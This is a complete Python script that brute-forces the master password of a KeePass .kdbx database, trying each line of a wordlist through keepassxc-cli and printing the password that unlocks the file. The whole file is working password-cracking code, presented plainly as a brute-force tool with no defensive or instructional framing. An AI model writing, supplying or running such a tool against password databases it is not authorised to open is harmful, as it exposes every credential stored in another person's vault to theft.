#!/usr/bin/env python3
import subprocess
import sys
import os

def trypass(db_path: str, passwd: str) -> bool:
    try:
        result = subprocess.run(
            ["keepassxc-cli", "ls", db_path],
            input=str(passwd).encode(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=3
        ); return result.returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except Exception as e:
        print("[-] Error:", e)
        return False
    
def Main(db_path: str, wl_path: str) -> str | None:
    if not os.path.isfile(db_path) or not str(db_path).endswith(".kdbx"):
        print("[!] Invalid kdbx file:", db_path)
        return None
    
    if not os.path.isfile(wl_path):
        print("[!] {} is not a file.".format(wl_path))
        return None
    
    full_db_path: str = os.path.realpath(db_path)
    full_wl_path: str = os.path.realpath(wl_path)
    w: int = len("[*] Wordlist:")
    
    print("{:<{w}} {}".format("[*] KDBX:", full_db_path))
    print("{:<{w}} {}".format("[*] Wordlist:", full_wl_path))
    print("[*] Starting brute-force...")
    
    with open(wl_path, 'r', encoding='utf-8') as f:
        for i, line in enumerate(f, 1):
            passwd: str = line.strip()
            if not passwd:
                continue
            if trypass(db_path, passwd):
                print("\n[+] {}:{}\n".format(full_db_path, passwd))
                print("[+] Finished after {} tries".format(i))
                return passwd
            if i % 1000 == 0:
                print("[*] {} passwords tried".format(i))

    print("[-] No passwords found :(")
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage:", sys.argv[0], "[.kdbx] [wordlist]")
        sys.exit()

    db_path: str = sys.argv[1]
    wl_path: str = sys.argv[2]
    Main(db_path, wl_path)